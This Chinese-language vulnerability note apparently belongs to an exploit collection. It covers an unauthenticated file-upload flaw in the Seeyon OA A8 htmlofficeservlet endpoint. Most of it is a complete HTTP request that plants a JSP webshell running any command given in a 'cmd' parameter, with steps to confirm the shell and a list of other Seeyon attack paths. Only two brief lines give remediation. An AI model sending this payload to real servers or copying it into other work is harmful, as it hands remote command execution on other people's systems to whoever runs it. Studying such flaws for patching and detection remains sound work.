## 漏洞描述

致远OA A8 系统 htmlofficeservlet 接口存在未授权文件上传漏洞，攻击者可以直接上传 JSP webshell。

## 影响版本

- 致远 A8 V6.1sp1
- 致远 A8+ V7.0

## 前置条件

- 无需认证
- 致远OA默认安装配置

## 利用步骤

1. 确认目标为致远OA（页面含 seeyon 特征）
2. 向 htmlofficeservlet 上传恶意文件

## Payload

```http
POST /seeyon/htmlofficeservlet HTTP/1.1
Host: target.com
Content-Type: application/octet-stream

DBSTEP V3.0     355             0               666
Option=SaveStMD5
currentUserId=
CREATEDATE=
RECORDID=
originalFileId=
originalCreateDate=
FILENAME=test123456.jsp
needReadFile=false
originalCreateDate=
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

## 其他致远OA 常见漏洞路径

```
/seeyon/htmlofficeservlet             → 文件上传
/seeyon/thirdpartyController.do       → 未授权访问
/seeyon/ajax.do?method=ajaxAction     → 反序列化
/seeyon/autoinstall.do.css            → 目录遍历
/seeyon/rest/authentication/ucpcLogin → 未授权
```

## 验证方法

上传后访问对应路径确认 webshell 是否生效。

## 修复建议

1. 升级致远OA 至最新补丁
2. 限制 htmlofficeservlet 的访问权限
